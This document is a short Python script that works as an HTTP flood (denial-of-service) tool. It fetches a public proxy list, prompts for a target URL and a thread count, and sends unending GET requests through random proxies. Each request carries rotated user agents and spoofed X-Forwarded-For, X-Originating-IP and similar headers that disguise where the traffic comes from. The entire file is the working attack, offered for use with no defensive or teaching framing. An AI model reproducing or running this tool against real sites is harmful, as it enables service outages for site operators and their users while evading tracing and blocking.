import requests
import random
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import threading
from colorama import Fore, init

init(autoreset=True)

def banner():
    print(Fore.CYAN + r'''
  ______   __        ________  ______  __    __   ______  
 /      \ /  |      /        |/      |/  \  /  | /      \ 
/$$$$$$  |$$ |      $$$$$$$$/ $$$$$$/ $$  \ $$ |/$$$$$$  |
$$ |__$$ |$$ |      $$ |__      $$ |  $$$  \$$ |$$ |__$$ |
$$    $$ |$$ |      $$    |     $$ |  $$$$  $$ |$$    $$ |
$$$$$$$$ |$$ |      $$$$$/      $$ |  $$ $$ $$ |$$$$$$$$ |
$$ |  $$ |$$ |_____ $$ |_____  _$$ |_ $$ |$$$$ |$$ |  $$ |
$$ |  $$ |$$       |$$       |/ $$   |$$ | $$$ |$$ |  $$ |
$$/   $$/ $$$$$$$$/ $$$$$$$$/ $$$$$$/ $$/   $$/ $$/   $$/ 
                  ''')

banner()
sn = [SoftwareName.CHROME.value]
os = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
rotator = UserAgent(software_names=sn, operating_systems=os, limit=10000)

req = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
r = requests.get(req)
with open('proxy.txt', 'w') as f:
    f.write(r.text)
print('Proxies saved to proxy.txt')

target = input("Target: ")
threadcount = int(input("Threads: "))
proxyraw = [line.rstrip('\n') for line in open("proxy.txt")]

def httpget():
    while True:
        try:
            proxy = random.choice(proxyraw)
            proxies = {"http": "http://"+proxy}
            ua = rotator.get_random_user_agent()
            randip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            headers = {
                "X-Forwarded-For": randip,
                "X-Originating-IP": randip,
                "X-Remote-IP": randip,
                "X-Remote-Addr": randip,
                "User-Agent": ua,
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "Keep-Alive"
            }
            requests.get(target, headers=headers, proxies=proxies, timeout=5)
            print(proxies)
        except Exception as e:
            print(e)

def threader():
    threads = []
    for i in range(threadcount):
        t = threading.Thread(target=httpget)
        threads.append(t)
        t.start()

threader()
